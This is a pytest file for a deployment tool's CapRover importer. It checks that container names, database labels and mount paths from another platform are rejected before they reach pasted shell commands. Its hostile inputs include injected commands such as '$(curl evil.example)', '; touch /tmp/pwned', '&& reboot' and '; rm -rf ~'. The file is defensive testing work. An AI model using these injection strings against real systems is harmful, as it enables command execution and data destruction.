# Copyright (c) 2024-2026 Yago Lopez Prado
# SPDX-License-Identifier: AGPL-3.0-or-later

"""
The commands an importer prints are for a person to paste, so what another platform supplies is
never put in one unchecked.

A name that reaches a command line is a name another platform's owner chose, and the person who
pastes the command is not always that owner (an agency reads a client's server). The allowlist is
at the chokepoint, ``base.database_commands`` and ``base.persistent_path_for``, not in each importer.
"""

from __future__ import annotations

from typing import Any

import pytest

from noust.deployers.importers.base import (
    database_commands,
    is_plain_name,
    persistent_path_for,
    service_container,
    tarball_restore,
)
from tests.test_importers_caprover import CACHE, DB, SHOP, definition, read

HOSTILE = [
    "x; touch /tmp/pwned",
    "x && reboot",
    "$(curl evil.example)",
    "`id`",
    "a b",
    'a"b',
    "a'b",
    "a\nb",
    "a|b",
    "-rf",
    "",
    "a" * 129,
]


@pytest.mark.parametrize("name", ["shop", "shop-db", "srv-captain--shop-db", "a.b_c-1", "0abc"])
def test_a_plain_name_may_go_on_a_command_line(name: str) -> None:
    assert is_plain_name(name)


@pytest.mark.parametrize("name", HOSTILE)
def test_a_name_with_anything_a_shell_reads_may_not(name: str) -> None:
    assert not is_plain_name(name)


def test_none_is_not_a_name() -> None:
    assert not is_plain_name(None)


def test_a_service_is_found_by_the_one_expression_and_only_for_a_plain_name() -> None:
    assert service_container("srv-captain--db") == "$(docker ps -qf name=^srv-captain--db\\.)"
    for name in HOSTILE:
        assert service_container(name) is None


def test_a_dump_is_written_for_a_plain_container_and_for_the_service_expression() -> None:
    plain = database_commands("postgresql", "abc-123", "shop", "abc-123")
    assert plain is not None
    assert plain[0].startswith("docker exec abc-123 sh -c ")

    expression = service_container("srv-captain--db")
    assert expression is not None
    assert database_commands("postgresql", expression, "db", "db") is not None


@pytest.mark.parametrize("name", HOSTILE)
def test_no_dump_is_written_for_a_hostile_container_or_label(name: str) -> None:
    assert database_commands("postgresql", name, "shop", "shop") is None
    assert database_commands("postgresql", "abc-123", "shop", name) is None
    assert database_commands("postgresql", "abc-123", name, "shop") is None


def test_an_expression_that_is_not_the_one_expression_is_not_a_container() -> None:
    for expression in (
        "$(curl evil.example)",
        "$(docker ps -qf name=^x; reboot\\.)",
        "$(docker ps -qf name=^x\\.) && reboot",
        "$(docker ps -qf name=^x)",
    ):
        assert database_commands("postgresql", expression, "x", "x") is None


@pytest.mark.parametrize(
    "mount",
    [
        "/app/up loads",
        "/app/a;b",
        "/app/$(id)",
        "/app/`id`",
        "/app/a'b",
        "/app/uploads; rm -rf ~",
        "/app/a b/c",
    ],
)
def test_a_mount_whose_path_a_shell_would_read_is_not_a_persistent_path(mount: str) -> None:
    assert persistent_path_for(mount, "/app") is None


@pytest.mark.parametrize(
    ("mount", "expected"),
    [
        ("/app/uploads", "uploads"),
        ("/app/.cache/pip", ".cache/pip"),
        ("/app/a-b_c/d.e", "a-b_c/d.e"),
    ],
)
def test_an_ordinary_mount_is_still_a_persistent_path(mount: str, expected: str) -> None:
    assert persistent_path_for(mount, "/app") == expected


def test_a_restore_never_carries_a_path_it_was_not_given_a_plain_one_for() -> None:
    assert tarball_restore("uploads") == "tar -xzf FILE.tar.gz -C /var/www/apps/APP/shared/uploads"
    assert tarball_restore("uploads; rm -rf ~") == "tar -xzf FILE.tar.gz -C FOLDER"
    assert tarball_restore(None) == "tar -xzf FILE.tar.gz -C FOLDER"


def test_a_caprover_database_app_named_to_run_a_command_gets_no_command() -> None:
    hostile = definition(
        "db; touch /tmp/pwned",
        notExposeAsWebApp=True,
        versions=[{"version": 1, "deployedImageName": "postgres:16-alpine"}],
    )
    shop: dict[str, Any] = {
        **SHOP,
        "envVars": [
            {
                "key": "DATABASE_URL",
                "value": "postgres://app@srv-captain--db; touch /tmp/pwned:5432/x",
            }
        ],
    }

    proposal = read("shop", shop, hostile, DB, CACHE)

    named = [d for d in proposal.database_details if d.name == "db; touch /tmp/pwned"]
    assert len(named) == 1
    assert named[0].dump is None and named[0].restore is None
    assert "No command is written for it" in "\n".join(proposal.warnings)
    assert "touch /tmp/pwned" not in "\n".join(
        str(d.dump) + str(d.restore) for d in proposal.database_details
    )
